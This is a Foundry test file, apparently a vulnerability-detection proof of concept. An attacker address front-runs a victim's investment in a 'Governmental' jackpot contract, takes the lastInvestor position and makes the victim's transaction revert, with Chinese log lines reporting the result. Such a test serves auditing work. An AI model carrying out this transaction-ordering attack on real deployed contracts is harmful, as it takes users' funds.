// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/governmental_survey.sol";

contract GovernmentalMinerAttackTest is Test {
    Governmental gov;
    address owner = makeAddr("owner");
    address alice = makeAddr("alice");
    address attacker = makeAddr("attacker");

    function setUp() public {
        vm.deal(owner, 100 ether);
        vm.deal(alice, 100 ether);
        vm.deal(attacker, 100 ether);

        vm.prank(owner);
        gov = new Governmental{value: 1 ether}();

        // First investment: 1 ether sets jackpot
        vm.prank(alice);
        gov.invest{value: 1 ether}();

        // Second investment: 2 ether increases jackpot
        vm.prank(alice);
        gov.invest{value: 2 ether}();
    }

    function testMinerFrontRun() public {
        // Verify setup jackpot = 2.5 ether
        assertEq(gov.jackpot(), 2.5 ether, "Setup failed: Jackpot should be 2.5 ether");

        uint256 victimInvestment = 1.25 ether;
        address expectedLastInvestor = attacker;
        address originalLastInvestor = gov.lastInvestor();

        console.log("--- BEFORE-Trigger ---");
        uint256 preJackpot = gov.jackpot();
        address preLastInvestor = gov.lastInvestor();
        console.log("Jackpot (before):", preJackpot);
        console.log("Last Investor (before):", preLastInvestor);

        console.log("--- TRIGGER: Attacker invests ---");
        vm.prank(attacker);
        gov.invest{value: victimInvestment}();

        console.log("--- AFTER-Trigger ---");
        uint256 postJackpot = gov.jackpot();
        address postLastInvestor = gov.lastInvestor();
        console.log("Jackpot (after):", postJackpot);
        console.log("Last Investor (after):", postLastInvestor);

        // Check differential state changes
        bool jackpotChanged = preJackpot != postJackpot;
        bool lastInvestorChanged = preLastInvestor != postLastInvestor;
        bool lastInvestorCorrect = (postLastInvestor == expectedLastInvestor);

        console.log("Jackpot changed:", jackpotChanged);
        console.log("Last Investor changed:", lastInvestorChanged);
        console.log("Last Investor is attacker:", lastInvestorCorrect);

        // Victim's transaction now fails (new minimum = 3.125/2 = 1.5625 ether)
        console.log("--- Test Victim Transaction ---");
        vm.prank(alice);
        vm.expectRevert();
        gov.invest{value: victimInvestment}();
        console.log("Victim transaction reverted as expected");

        // Final verdict - only one line printed at end
        if (jackpotChanged && lastInvestorChanged && lastInvestorCorrect) {
            console.log(unicode"Vulnerability Exists: 攻击者成功修改奖金池金额并成为最后投资者");
        } else {
            console.log(unicode"Vulnerability not Exist: 奖金池或最后投资者未发生预期变化");
        }
    }
}